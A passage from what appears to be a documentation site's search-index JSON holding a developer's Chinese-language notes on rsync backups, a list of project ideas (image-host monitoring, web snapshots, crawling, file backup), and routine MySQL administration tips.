\u5c0f\u6587\u4ef6\u592a\u591a\u4e0d\u5efa\u8bae\u4f7f\u7528rsync-time-backup\uff0c\u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u786c\u94fe\u63a5\uff0c\u5360\u636e\u5927\u91cfbtrfs metadata\u7a7a\u95f4 \u5907\u4efd\u8fc7\u7a0b\u4e2d\u663e\u793a\u7684\u7406\u89e3\uff1a https://unix.stackexchange.com/questions/215271/understanding-the-output-of-info-progress2-from-rsync xfr#495 \u8868\u793a\u5f53\u524d\u6b63\u5728\u4f20\u8f93\u7b2c495\u4e2a\u6587\u4ef6 ir-chk=1020/3825 \u5df2\u7ecf\u77e5\u9053\u67093825\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d1020\u4e2a\u9700\u8981\u68c0\u67e5\u76ee\u6807\u4f4d\u7f6e\u7684\u6587\u4ef6\u662f\u5426\u4e00\u81f4","title":"\u4f7f\u7528rsync\u5907\u4efd\u5168\u76d8"},{"location":"Misson/","text":"\u8bf4\u660e \u00b6 \u8fd9\u4e2a\u6587\u4ef6\u662f\u6211\u7684Idea\u4eec\uff0c\u6316\u4e2a\u5751\u5f85\u586b \u6709\u5174\u8da3\u548c\u6211\u4e00\u8d77\u5e72\u6216\u544a\u77e5\u73b0\u6709\u7684\u6280\u672f\uff0c\u6b22\u8fce\u63d0issue\u6216\u53d1\u9001\u90ae\u4ef6\uff1agithub@qiushi.ac.cn \u56fe\u5e8a\u53ef\u7528\u6027\u76d1\u6d4b+\u7279\u6027\u6d4b\u8bd5\u6570\u636e\uff1f \u00b6 \u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u6709\u5f88\u591a\u56fe\u5e8a\u670d\u52a1\uff0c\u4f46\u4f3c\u4e4e\u5e76\u6ca1\u6709\u53ef\u7528\u6027\u76d1\u6d4b\u6570\u636e\uff0c\u76f4\u63a5\u4f7f\u7528\u4e4b\u524d\u8fd8\u9700\u8981\u81ea\u884c\u6d4b\u8bd5\u662f\u5426\u6709\u9632\u76d7\u94fe\u7b49\u7279\u6027\uff0c\u6709\u6ca1\u6709\u8fd9\u6837\u4e00\u4e2a\u56fe\u5e8a\u6d4b\u8bd5\u670d\u52a1\u6765\u63d0\u4f9b\u8fd9\u4e9b\u6570\u636e\u5462\uff1f \u4f8b\u5982\u8fd9\u4e9b\u56fe\u5e8a\u4e0a\u4f20\u4ee3\u7801\uff1a https://www.npmjs.com/package/upimg/v/0.1.8 https://github.com/aimerforreimu/auxpi/tree/dev/server \u6bcf\u5929\u6d4b\u4e00\u6b21\u4e0a\u4f20\u670d\u52a1\u53ef\u7528\u6027\uff0c\u6bcf\u5c0f\u65f6\u6d4b\u4e00\u6b21 cdn \u4e0b\u8f7d\u53ef\u9760\u6027 \u7279\u6027\u6307\u6807\uff1a \u53ef\u9760\u6027\uff1a\u4f1a\u4e0d\u4f1a 404\u3001\u670d\u52a1\u5668\u8dd1\u8def\uff08\u5982\u718a\u732b\u76f4\u64ad\u3001360 \u4e91\u76d8\uff09\u3001\u662f\u5426\u53cb\u597d\uff08\u5f15\u7528\u81ea npm upimg \u5305 0.1.8\uff1a\u7531\u4e8e\u67d0\u516c\u53f8\u65b9\u9762\u65bd\u538b\uff0cupimg \u5c06\u4e0d\u7ef4\u62a4\u4ee5\u4e0a\u5217\u8868\u5916\u670d\u52a1\u7684\u53ef\u7528\u6027\uff09 \u6613\u7528\u6027\uff1a\u7279\u5b9a\u8bed\u8a00\u4e0b\u662f\u5426\u5df2\u7ecf\u6709\u5f00\u6e90\u4ee3\u7801\u5b9e\u73b0\u4e0a\u4f20\u529f\u80fd \uff08\u4f8b\u5982\u817e\u8baf\u4e91 cos \u524d\u7aef\u4e0a\u4f20\u5c31\u6ca1\u6709\u540e\u7aef\u8bed\u8a00\u7684\u5b9e\u73b0\uff09 \u524d\u7aef\u53ef\u7528\uff1a\u53ef\u5426\u5728\u5176\u4ed6\u7f51\u7ad9\u4e0a\u4f20\uff0c\u662f\u5426\u9632\u76d7\u94fe\uff0c\u662f\u5426\u53ef\u4ee5\u8de8\u57df\u8bfb\u53d6\u5185\u5bb9\uff0c\u8bbf\u95ee\u9891\u7387\u9650\u5236\uff0c\u76f4\u63a5\u6253\u5f00 url \u662f\u5426\u5f3a\u5236\u4e0b\u8f7d \u540e\u7aef\u53ef\u7528\uff1a\u7ef4\u62a4\u767b\u5f55 cookie \u662f\u5426\u5bb9\u6613\uff08\u767b\u5f55\u9a8c\u8bc1\u7801\uff09\uff0c\u8bf7\u6c42\u9891\u7387\u9650\u5236 \u4e0d\u6b62\u4e8e\u56fe\u7247\uff1a\u662f\u5426\u538b\u7f29\u56fe\u7247\uff0c\u662f\u5426\u53ef\u4ee5\u4e0a\u4f20\u975e\u56fe\u7247\u4e8c\u8fdb\u5236\uff0c\u5355\u4e2a\u6587\u4ef6\u6700\u5927\u5927\u5c0f \u5b89\u5168\uff1a\u662f\u5426\u652f\u6301\u5220\u9664\uff0c\u4f20\u8f93 https\uff0c\u8bbf\u95ee https misc\uff1a\u751f\u6210 url \u957f\u5ea6\uff0c\u662f\u5426\u9650\u5236\u56fd\u5916\u8bbf\u95ee\uff0ccdn \u8282\u70b9\u5e7f\u5ea6\uff0c\u662f\u5426\u88ab\u5899 Deny404 \u00b6 360\u6781\u901f\u6d4f\u89c8\u5668\u66fe\u7ecf\u6709\u7684\u7f51\u9875\u5feb\u7167\u529f\u80fd\uff0c\u80fd\u4e0d\u80fd\u7528Chrome\u6269\u5c55\u5b9e\u73b0 \u8981\u6c42\u5728\u4e0d\u5f15\u7528\u4efb\u4f55\u5916\u90e8\u8d44\u6e90\u7684\u60c5\u51b5\u4e0b\u5c55\u793a\u51fa\u548c\u539f\u7f51\u9875\u57fa\u672c\u76f8\u540c\u7684\u6548\u679c \u751f\u6210\u6587\u4ef6\u5c3d\u91cf\u5c11\uff0c\u80fdpush\u5230github \u53e6\u5916\u4e5f\u9700\u8981\u5168\u6587\u68c0\u7d22 \u5165\u624b\uff1a\u8003\u8651\u590d\u5236\u7f51\u9875\u6587\u672c+cutycapt\u4fdd\u5b58\u56fe\u7247 \u76ee\u524d\u7684\u5b9e\u73b0\uff1a\u5370\u8c61\u7b14\u8bb0/Evernote\u7684\u526a\u85cf\u63d2\u4ef6\uff0c\u7136\u540e\u7528api\u5bfc\u51fa \u53c2\u89c1 evernote2ipfs EasyCrawler \u00b6 \u7ed9\u51fa\u4e24\u4e09\u4e2a\u7f51\u9875url\uff0c\u81ea\u52a8diff\u5206\u6790\u7f51\u9875\u5185\u5bb9\u6240\u5728\u7684tag\uff0c\u5f97\u51fa\u4eceurl\u2192\u5185\u5bb9\u7684\u7b97\u6cd5 \u751a\u81f3\u7ed9\u51fa\u7f51\u7ad9\u57df\u540d\u76f4\u63a5\u722c\u53d6\u5168\u7ad9\u5e76\u63d0\u53d6\u5185\u5bb9\u5230\u6570\u636e\u5e93\u4ee5\u4fbf\u538b\u7f29\u5b58\u50a8 \u5165\u624b\uff1a\u4e5f\u8bb8\u9700\u8981\u4e86\u89e3lxml WAF \u00b6 \u5f00\u6e90\u7684WAF? \u6587\u4ef6\u6574\u7406 \u00b6 \u6709\u4e86Everything\u627e\u6587\u4ef6\u65b9\u4fbf\u4e86\u4e00\u70b9 windows\u4e0b\u6709\u6ca1\u6709\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u8bb0\u5173\u952e\u8bcd\u3001\u673a\u5bc6\u7b49\u7ea7\u7684explorer\u7684\u6269\u5c55\u5462\u3002\u3002\u3002 \u673a\u5bc6\u6587\u4ef6\u8981\u81ea\u52a8\u52a0\u5bc6\uff0c\u9700\u8981google authenticator\u4e24\u6b65\u9a8c\u8bc1\u89e3\u5bc6 \u91cd\u8981\u6587\u4ef6\u9700\u8981\u81ea\u52a8\u5f02\u5730\u5907\u4efd\uff0c\u5e76\u63d0\u9192\u4f7f\u7528\u79fb\u52a8\u786c\u76d8\u79bb\u7ebf\u5907\u4efd+\u63d2\u5165\u786c\u76d8\u540e\u81ea\u52a8\u5907\u4efd\u9700\u8981\u5907\u4efd\u7684\u4e1c\u897f \u6709\u6ca1\u6709Explorer\u53f3\u952e\u6269\u5c55\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u8bb0tag\u7684\u5de5\u5177\uff1f \u6807\u8bb0\u4e3a\u91cd\u8981\u7684\u6587\u4ef6\u81ea\u52a8\u91c7\u7528\u591a\u79cd\u5b58\u50a8\u65b9\u6848\u8fdb\u884c\u5907\u4efd+\u7248\u672c\u63a7\u5236\uff0c\u652f\u6301\u81ea\u5df1\u5916\u63a5\u786c\u76d8\uff08\u63d0\u9192\uff09\u3001\u4e0a\u4f20\u5230\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a \u4e0d\u53ef\u9760\uff1a\u81ea\u5df1\u7684\u786c\u76d8\u3001\u767e\u5ea6\u7f51\u76d8 \u514d\u8d39\u7684\u4e91\u76d8\u670d\u52a1\uff1a\u5929\u7ffc\u4e91\u76d8\u3001\u575a\u679c\u4e91\u3001\u4ebf\u65b9\u4e91\u3001\u5976\u725b\u5feb\u4f20\u3001\u6d59\u5927\u4e91\u76d8 \u81ea\u5efa\u7684\u4e91\u4e0a\u5b58\u50a8\uff1a\u81ea\u5df1\u670d\u52a1\u5668(Seafile)\u3001Google Drive\u3001OneDrive \u5546\u4e1a\u5316\u7684\u5bf9\u8c61\u5b58\u50a8\uff1a\u963f\u91ccOSS\u3001\u817e\u8baf\u4e91COS\u3001\u53c8\u62cd\u4e91\u3001\u4e03\u725b\u3001AWS S3\u3001\u767e\u5ea6\u4e91 \u4e5f\u80fd\u5b58\u4f46\u4e0d\u9002\u5408\uff1a\u90ae\u4ef6\u9644\u4ef6\u3001Github\u3001\u5370\u8c61\u7b14\u8bb0 \u5907\u4efd\u7684\u540c\u65f6\u8981\u652f\u6301\u6587\u4ef6\u52a0\u5bc6\u5b58\u50a8 \u6807\u8bb0\u4e3a\u5de5\u4f5c\u6587\u4ef6\u8981\u652f\u6301\u624b\u673a\u7aef\u8bbf\u95ee \u7528\u6237\u53ea\u8981\u9f20\u6807\u53f3\u952e\u70b9\u4e00\u70b9\uff0c\u540e\u53f0\u81ea\u52a8\u5904\u7406\u52a0\u5bc6\u3001\u4f20\u8f93\u7684\u95ee\u9898\uff0c\u5e76\u8003\u8651\u5355\u4e00\u670d\u52a1\u4e0d\u518d\u53ef\u7528\u7684\u98ce\u9669 \u55ef\u3002\u3002\u3002\u65e2\u8981\u7ecf\u6d4e\u53c8\u8981\u53ef\u9760\u4f3c\u4e4e\u5f88\u9ebb\u70e623333\uff1f \u4e00\u7ad9\u5f0f\u83b7\u53d6\u6240\u6709\u6211\u5e94\u8be5\u77e5\u9053\u7684\u4fe1\u606f \u00b6 \u4e5f\u8bb8\u5c31\u662f\u5982\u4f55\u63a8\u9001\u5230\u65e5\u5386\u5427\u3002\u3002\u3002win10\u6709\u6ca1\u6709\u53ef\u7f16\u7a0b\u7684\u684c\u9762\u5c0f\u90e8\u4ef6\u5462\u3002\u3002\u3002 \u6709\u6ca1\u6709\u4e00\u4e2a\u5c4f\u5e55\u76f4\u63a5\u663e\u793a\u6211\u6240\u7ba1\u7406\u7684\u6240\u6709\u670d\u52a1\u5668\u7684\u72b6\u6001\u7684\u7a0b\u5e8f\u5462\u3002\u3002\u3002 \u4e5f\u9700\u8981\u722c\u866b\u722c\u4e00\u4e0b\u9662\u7f51 \u91cd\u8981\u7684\u63d0\u9192\u53d1\u4e2a\u90ae\u4ef6\u901a\u77e5\u81ea\u5df1 \u57fa\u4e8e\u6d59\u5927\u4e91\u76d8\u505a\u51fa\u4e0a\u4f20\u5206\u4eabAPI[Finished] \u00b6 \u672cidea\u5df2\u7ecf\u5b9e\u73b0\uff1ahttps://github.com/zjuchenyuan/EasyLogin/tree/master/examples/fangcloud \u6bcf\u4e2a\u4eba2T\u7684\u5b58\u50a8\u7a7a\u95f4\u600e\u4e48\u80fd\u9519\u8fc7\u3002\u3002\u3002 \u4e0d\u8fc7\u4ebf\u65b9\u4e91\u8fd8\u6ca1\u6709\u7ed9\u6d59\u5927\u4e91\u76d8\u641e\u5ba2\u6237\u7aef\uff0c\u4e0a\u4f20\u6709\u70b9\u70e6 \u7814\u7a76\u4e00\u4e0b\u5982\u4f55\u4eceteam.zju.edu.cn\u5f00\u59cb\u767b\u5f55\u4e0a\u4f20\u5206\u4eab\u4e0b\u8f7d\u4e00\u6761\u9f99\u7684API\u5b9e\u73b0 upyun https \u8bc1\u4e66\u66f4\u65b0[Finished] \u00b6 \u81ea\u52a8\u5316\u66f4\u65b0\u8bc1\u4e66 \u907f\u514d\u624b\u52a8\u590d\u5236\u7c98\u8d34 https://github.com/zjuchenyuan/EasyLogin/blob/master/examples/upyun/upyun.py","title":"\u8bf4\u660e"},{"location":"Misson/#_1","text":"\u8fd9\u4e2a\u6587\u4ef6\u662f\u6211\u7684Idea\u4eec\uff0c\u6316\u4e2a\u5751\u5f85\u586b \u6709\u5174\u8da3\u548c\u6211\u4e00\u8d77\u5e72\u6216\u544a\u77e5\u73b0\u6709\u7684\u6280\u672f\uff0c\u6b22\u8fce\u63d0issue\u6216\u53d1\u9001\u90ae\u4ef6\uff1agithub@qiushi.ac.cn","title":"\u8bf4\u660e"},{"location":"Misson/#_2","text":"\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u6709\u5f88\u591a\u56fe\u5e8a\u670d\u52a1\uff0c\u4f46\u4f3c\u4e4e\u5e76\u6ca1\u6709\u53ef\u7528\u6027\u76d1\u6d4b\u6570\u636e\uff0c\u76f4\u63a5\u4f7f\u7528\u4e4b\u524d\u8fd8\u9700\u8981\u81ea\u884c\u6d4b\u8bd5\u662f\u5426\u6709\u9632\u76d7\u94fe\u7b49\u7279\u6027\uff0c\u6709\u6ca1\u6709\u8fd9\u6837\u4e00\u4e2a\u56fe\u5e8a\u6d4b\u8bd5\u670d\u52a1\u6765\u63d0\u4f9b\u8fd9\u4e9b\u6570\u636e\u5462\uff1f \u4f8b\u5982\u8fd9\u4e9b\u56fe\u5e8a\u4e0a\u4f20\u4ee3\u7801\uff1a https://www.npmjs.com/package/upimg/v/0.1.8 https://github.com/aimerforreimu/auxpi/tree/dev/server \u6bcf\u5929\u6d4b\u4e00\u6b21\u4e0a\u4f20\u670d\u52a1\u53ef\u7528\u6027\uff0c\u6bcf\u5c0f\u65f6\u6d4b\u4e00\u6b21 cdn \u4e0b\u8f7d\u53ef\u9760\u6027 \u7279\u6027\u6307\u6807\uff1a \u53ef\u9760\u6027\uff1a\u4f1a\u4e0d\u4f1a 404\u3001\u670d\u52a1\u5668\u8dd1\u8def\uff08\u5982\u718a\u732b\u76f4\u64ad\u3001360 \u4e91\u76d8\uff09\u3001\u662f\u5426\u53cb\u597d\uff08\u5f15\u7528\u81ea npm upimg \u5305 0.1.8\uff1a\u7531\u4e8e\u67d0\u516c\u53f8\u65b9\u9762\u65bd\u538b\uff0cupimg \u5c06\u4e0d\u7ef4\u62a4\u4ee5\u4e0a\u5217\u8868\u5916\u670d\u52a1\u7684\u53ef\u7528\u6027\uff09 \u6613\u7528\u6027\uff1a\u7279\u5b9a\u8bed\u8a00\u4e0b\u662f\u5426\u5df2\u7ecf\u6709\u5f00\u6e90\u4ee3\u7801\u5b9e\u73b0\u4e0a\u4f20\u529f\u80fd \uff08\u4f8b\u5982\u817e\u8baf\u4e91 cos \u524d\u7aef\u4e0a\u4f20\u5c31\u6ca1\u6709\u540e\u7aef\u8bed\u8a00\u7684\u5b9e\u73b0\uff09 \u524d\u7aef\u53ef\u7528\uff1a\u53ef\u5426\u5728\u5176\u4ed6\u7f51\u7ad9\u4e0a\u4f20\uff0c\u662f\u5426\u9632\u76d7\u94fe\uff0c\u662f\u5426\u53ef\u4ee5\u8de8\u57df\u8bfb\u53d6\u5185\u5bb9\uff0c\u8bbf\u95ee\u9891\u7387\u9650\u5236\uff0c\u76f4\u63a5\u6253\u5f00 url \u662f\u5426\u5f3a\u5236\u4e0b\u8f7d \u540e\u7aef\u53ef\u7528\uff1a\u7ef4\u62a4\u767b\u5f55 cookie \u662f\u5426\u5bb9\u6613\uff08\u767b\u5f55\u9a8c\u8bc1\u7801\uff09\uff0c\u8bf7\u6c42\u9891\u7387\u9650\u5236 \u4e0d\u6b62\u4e8e\u56fe\u7247\uff1a\u662f\u5426\u538b\u7f29\u56fe\u7247\uff0c\u662f\u5426\u53ef\u4ee5\u4e0a\u4f20\u975e\u56fe\u7247\u4e8c\u8fdb\u5236\uff0c\u5355\u4e2a\u6587\u4ef6\u6700\u5927\u5927\u5c0f \u5b89\u5168\uff1a\u662f\u5426\u652f\u6301\u5220\u9664\uff0c\u4f20\u8f93 https\uff0c\u8bbf\u95ee https misc\uff1a\u751f\u6210 url \u957f\u5ea6\uff0c\u662f\u5426\u9650\u5236\u56fd\u5916\u8bbf\u95ee\uff0ccdn \u8282\u70b9\u5e7f\u5ea6\uff0c\u662f\u5426\u88ab\u5899","title":"\u56fe\u5e8a\u53ef\u7528\u6027\u76d1\u6d4b+\u7279\u6027\u6d4b\u8bd5\u6570\u636e\uff1f"},{"location":"Misson/#deny404","text":"360\u6781\u901f\u6d4f\u89c8\u5668\u66fe\u7ecf\u6709\u7684\u7f51\u9875\u5feb\u7167\u529f\u80fd\uff0c\u80fd\u4e0d\u80fd\u7528Chrome\u6269\u5c55\u5b9e\u73b0 \u8981\u6c42\u5728\u4e0d\u5f15\u7528\u4efb\u4f55\u5916\u90e8\u8d44\u6e90\u7684\u60c5\u51b5\u4e0b\u5c55\u793a\u51fa\u548c\u539f\u7f51\u9875\u57fa\u672c\u76f8\u540c\u7684\u6548\u679c \u751f\u6210\u6587\u4ef6\u5c3d\u91cf\u5c11\uff0c\u80fdpush\u5230github \u53e6\u5916\u4e5f\u9700\u8981\u5168\u6587\u68c0\u7d22 \u5165\u624b\uff1a\u8003\u8651\u590d\u5236\u7f51\u9875\u6587\u672c+cutycapt\u4fdd\u5b58\u56fe\u7247 \u76ee\u524d\u7684\u5b9e\u73b0\uff1a\u5370\u8c61\u7b14\u8bb0/Evernote\u7684\u526a\u85cf\u63d2\u4ef6\uff0c\u7136\u540e\u7528api\u5bfc\u51fa \u53c2\u89c1 evernote2ipfs","title":"Deny404"},{"location":"Misson/#easycrawler","text":"\u7ed9\u51fa\u4e24\u4e09\u4e2a\u7f51\u9875url\uff0c\u81ea\u52a8diff\u5206\u6790\u7f51\u9875\u5185\u5bb9\u6240\u5728\u7684tag\uff0c\u5f97\u51fa\u4eceurl\u2192\u5185\u5bb9\u7684\u7b97\u6cd5 \u751a\u81f3\u7ed9\u51fa\u7f51\u7ad9\u57df\u540d\u76f4\u63a5\u722c\u53d6\u5168\u7ad9\u5e76\u63d0\u53d6\u5185\u5bb9\u5230\u6570\u636e\u5e93\u4ee5\u4fbf\u538b\u7f29\u5b58\u50a8 \u5165\u624b\uff1a\u4e5f\u8bb8\u9700\u8981\u4e86\u89e3lxml","title":"EasyCrawler"},{"location":"Misson/#waf","text":"\u5f00\u6e90\u7684WAF?","title":"WAF"},{"location":"Misson/#_3","text":"\u6709\u4e86Everything\u627e\u6587\u4ef6\u65b9\u4fbf\u4e86\u4e00\u70b9 windows\u4e0b\u6709\u6ca1\u6709\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u8bb0\u5173\u952e\u8bcd\u3001\u673a\u5bc6\u7b49\u7ea7\u7684explorer\u7684\u6269\u5c55\u5462\u3002\u3002\u3002 \u673a\u5bc6\u6587\u4ef6\u8981\u81ea\u52a8\u52a0\u5bc6\uff0c\u9700\u8981google authenticator\u4e24\u6b65\u9a8c\u8bc1\u89e3\u5bc6 \u91cd\u8981\u6587\u4ef6\u9700\u8981\u81ea\u52a8\u5f02\u5730\u5907\u4efd\uff0c\u5e76\u63d0\u9192\u4f7f\u7528\u79fb\u52a8\u786c\u76d8\u79bb\u7ebf\u5907\u4efd+\u63d2\u5165\u786c\u76d8\u540e\u81ea\u52a8\u5907\u4efd\u9700\u8981\u5907\u4efd\u7684\u4e1c\u897f \u6709\u6ca1\u6709Explorer\u53f3\u952e\u6269\u5c55\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u8bb0tag\u7684\u5de5\u5177\uff1f \u6807\u8bb0\u4e3a\u91cd\u8981\u7684\u6587\u4ef6\u81ea\u52a8\u91c7\u7528\u591a\u79cd\u5b58\u50a8\u65b9\u6848\u8fdb\u884c\u5907\u4efd+\u7248\u672c\u63a7\u5236\uff0c\u652f\u6301\u81ea\u5df1\u5916\u63a5\u786c\u76d8\uff08\u63d0\u9192\uff09\u3001\u4e0a\u4f20\u5230\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a \u4e0d\u53ef\u9760\uff1a\u81ea\u5df1\u7684\u786c\u76d8\u3001\u767e\u5ea6\u7f51\u76d8 \u514d\u8d39\u7684\u4e91\u76d8\u670d\u52a1\uff1a\u5929\u7ffc\u4e91\u76d8\u3001\u575a\u679c\u4e91\u3001\u4ebf\u65b9\u4e91\u3001\u5976\u725b\u5feb\u4f20\u3001\u6d59\u5927\u4e91\u76d8 \u81ea\u5efa\u7684\u4e91\u4e0a\u5b58\u50a8\uff1a\u81ea\u5df1\u670d\u52a1\u5668(Seafile)\u3001Google Drive\u3001OneDrive \u5546\u4e1a\u5316\u7684\u5bf9\u8c61\u5b58\u50a8\uff1a\u963f\u91ccOSS\u3001\u817e\u8baf\u4e91COS\u3001\u53c8\u62cd\u4e91\u3001\u4e03\u725b\u3001AWS S3\u3001\u767e\u5ea6\u4e91 \u4e5f\u80fd\u5b58\u4f46\u4e0d\u9002\u5408\uff1a\u90ae\u4ef6\u9644\u4ef6\u3001Github\u3001\u5370\u8c61\u7b14\u8bb0 \u5907\u4efd\u7684\u540c\u65f6\u8981\u652f\u6301\u6587\u4ef6\u52a0\u5bc6\u5b58\u50a8 \u6807\u8bb0\u4e3a\u5de5\u4f5c\u6587\u4ef6\u8981\u652f\u6301\u624b\u673a\u7aef\u8bbf\u95ee \u7528\u6237\u53ea\u8981\u9f20\u6807\u53f3\u952e\u70b9\u4e00\u70b9\uff0c\u540e\u53f0\u81ea\u52a8\u5904\u7406\u52a0\u5bc6\u3001\u4f20\u8f93\u7684\u95ee\u9898\uff0c\u5e76\u8003\u8651\u5355\u4e00\u670d\u52a1\u4e0d\u518d\u53ef\u7528\u7684\u98ce\u9669 \u55ef\u3002\u3002\u3002\u65e2\u8981\u7ecf\u6d4e\u53c8\u8981\u53ef\u9760\u4f3c\u4e4e\u5f88\u9ebb\u70e623333\uff1f","title":"\u6587\u4ef6\u6574\u7406"},{"location":"Misson/#_4","text":"\u4e5f\u8bb8\u5c31\u662f\u5982\u4f55\u63a8\u9001\u5230\u65e5\u5386\u5427\u3002\u3002\u3002win10\u6709\u6ca1\u6709\u53ef\u7f16\u7a0b\u7684\u684c\u9762\u5c0f\u90e8\u4ef6\u5462\u3002\u3002\u3002 \u6709\u6ca1\u6709\u4e00\u4e2a\u5c4f\u5e55\u76f4\u63a5\u663e\u793a\u6211\u6240\u7ba1\u7406\u7684\u6240\u6709\u670d\u52a1\u5668\u7684\u72b6\u6001\u7684\u7a0b\u5e8f\u5462\u3002\u3002\u3002 \u4e5f\u9700\u8981\u722c\u866b\u722c\u4e00\u4e0b\u9662\u7f51 \u91cd\u8981\u7684\u63d0\u9192\u53d1\u4e2a\u90ae\u4ef6\u901a\u77e5\u81ea\u5df1","title":"\u4e00\u7ad9\u5f0f\u83b7\u53d6\u6240\u6709\u6211\u5e94\u8be5\u77e5\u9053\u7684\u4fe1\u606f"},{"location":"Misson/#apifinished","text":"\u672cidea\u5df2\u7ecf\u5b9e\u73b0\uff1ahttps://github.com/zjuchenyuan/EasyLogin/tree/master/examples/fangcloud \u6bcf\u4e2a\u4eba2T\u7684\u5b58\u50a8\u7a7a\u95f4\u600e\u4e48\u80fd\u9519\u8fc7\u3002\u3002\u3002 \u4e0d\u8fc7\u4ebf\u65b9\u4e91\u8fd8\u6ca1\u6709\u7ed9\u6d59\u5927\u4e91\u76d8\u641e\u5ba2\u6237\u7aef\uff0c\u4e0a\u4f20\u6709\u70b9\u70e6 \u7814\u7a76\u4e00\u4e0b\u5982\u4f55\u4eceteam.zju.edu.cn\u5f00\u59cb\u767b\u5f55\u4e0a\u4f20\u5206\u4eab\u4e0b\u8f7d\u4e00\u6761\u9f99\u7684API\u5b9e\u73b0","title":"\u57fa\u4e8e\u6d59\u5927\u4e91\u76d8\u505a\u51fa\u4e0a\u4f20\u5206\u4eabAPI[Finished]"},{"location":"Misson/#upyun-https-finished","text":"\u81ea\u52a8\u5316\u66f4\u65b0\u8bc1\u4e66 \u907f\u514d\u624b\u52a8\u590d\u5236\u7c98\u8d34 https://github.com/zjuchenyuan/EasyLogin/blob/master/examples/upyun/upyun.py","title":"upyun https \u8bc1\u4e66\u66f4\u65b0[Finished]"},{"location":"MySQL/","text":"\u67e5\u770b\u8868\u7ed3\u6784 \u00b6 desc \u8868\u540d\u79f0; \u67e5\u770b\u5efa\u8868sql\u8bed\u53e5 \u00b6 show create table \u8868\u540d\u79f0; MERGE\u5b58\u50a8\u5f15\u64ce \u00b6 \u5b98\u65b9\u6587\u6863\uff1ahttp://dev.mysql.com/doc/refman/5.7/en/merge-storage-engine.html \u67e5\u770b\u80fd\u7528\u7684\u5f15\u64ce\uff1a show engines \u521b\u5efa\u4e00\u4e2aMERGE\u8868\uff1a \u00b6 \u5047\u8bbe\u6709a,b\u8868\uff0c\u4ed6\u4eec\u7684\u7ed3\u6784\u5b8c\u5168\u76f8\u540c\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2ac\u8868\uff0c\u6ce8\u610f\u8fd9\u4e2a\u8868\u7684\u5b9a\u4e49\u8981\u4e0ea\u548cb\u8868\u5b8c\u5168\u4e00\u81f4 drop table if exists data ; CREATE TABLE c ( ` id ` int ( 11 ) NOT NULL , ` data ` longtext NOT NULL , PRIMARY KEY ( ` id ` ) ) ENGINE = MRG_MYISAM , UNION = ( a , b ); \u7279\u70b9\uff1a \u8fd9\u79cd\u8868\u4e0d\u4f1a\u521b\u5efa\u989d\u5916\u7684\u7d22\u5f15\uff0c\u4f46\u67e5\u8be2\u8d77\u6765\u6bd4\u89c6\u56fe\u901f\u5ea6\u66f4\u5feb\uff1b \u4e0d\u80fd\u5728\u8fd9\u79cd\u8868\u4e0a\u5efa\u7acb\u5168\u6587\u7d22\u5f15 \u5220\u9664\u8868\u7684\u5197\u4f59 \u00b6 \u4e24\u884c\u53ea\u6709\u4e00\u5217(\u8fd9\u91cc\u5047\u8bbe\u4e3a gettime )\u4e0d\u540c\uff0c\u5220\u9664\u5176\u4e2d\u4e00\u884c delete t1 from t as t1 , t as t2 where t1 . id = t2 . id and t1 . \u5176\u4ed6\u5217 = t2 . \u5176\u4ed6\u5217 and t1 . gettime > t2 . gettime ; \u4fee\u6539\u8868 alter table \u00b6 ALTER IGNORE TABLE ` \u8868\u540d\u79f0 ` MODIFY COLUMN ` id ` int ( 11 ) NOT NULL FIRST , MODIFY COLUMN ` user ` varchar ( 66 ) NOT NULL AFTER ` id ` , MODIFY COLUMN ` content ` longtext NOT NULL AFTER ` user ` , DROP PRIMARY KEY , ADD PRIMARY KEY ( ` id ` ), DROP INDEX ` a1 ` , ADD INDEX ` a1 ` ( ` user ` ); \u5c06\u4e2d\u6587\u8f6c\u4e3a\u62fc\u97f3 \u51fd\u6570 \u00b6 \u4ee3\u7801\u5728 code/pinyin.sql \u4ece\u8def\u5f84URL\u83b7\u53d6\u6587\u4ef6\u540d\u79f0 \u00b6 \u6765\u6e90 http://stackoverflow.com/questions/17090237/extracting-filenames-from-a-path-mysql \u4f7f\u7528SUBSTRING_INDEX\u51fd\u6570\uff0c\u5047\u8bbeurl\u6b64\u884c\u7684\u5185\u5bb9\u4e3a\u201dhttp://example.com/some/path/to/filename.zip\u201d select SUBSTRING_INDEX(url, '/', -1) as filename; \u5373\u53ef\u5f97\u5230\u4e00\u5217filename\uff0c\u6b64\u884c\u6570\u636e\u4e3a\u201dfilename.zip\u201d \u67e5\u8be2\u4f18\u5316 \u00b6 explain\u53d1\u73b0\u51fa\u73b0\u4e86using filesort \u00b6 \u53c2\u8003 http://www.ccvita.com/169.html \u5982\u679c\u4f7f\u7528\u4e86order by\u6216\u8005group by\uff0c\u9700\u8981\u5efa\u7d22\u5f15\u4ee5\u4f18\u5316\u8fd9\u4e2a\u67e5\u8be2 group by\u7528\u4e86\u4e24\u4e2a\u5217\uff0c\u4e24\u5217\u8981\u5408\u5728\u4e00\u8d77\u521b\u5efa\u7d22\u5f15 \u5185\u5b58\u8868\u7d22\u5f15\u7684\u9009\u62e9 \u00b6 \u53c2\u8003 https://dev.mysql.com/doc/refman/5.5/en/optimizing-memory-tables.html \u5185\u5b58\u8868\u7684\u7d22\u5f15\u5e94\u8be5\u9009\u62e9BTREE \u5185\u5b58\u8868The table is full \u00b6 \u4fee\u6539MySQL\u7684\u914d\u7f6e\u6587\u4ef6/etc/mysql/my.cnf\uff0c\u5728[mysqld]\u4e0b\u6dfb\u52a0/\u4fee\u6539\u4e24\u884c(\u4e0b\u9762\u7684\u503c\u4ec5\u4f9b\u53c2\u8003,\u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u914c\u60c5\u5904\u7406)\uff1a tmp_table_size = 256M // \u4e34\u65f6\u8868\u5927\u5c0f max_heap_table_size = 256M // \u5185\u5b58\u8868\u5927\u5c0f replace\u51fd\u6570\u66ff\u6362\u6587\u672c \u00b6 update `content` set value = replace ( value , \"original content\" , \"replaced content\" ); 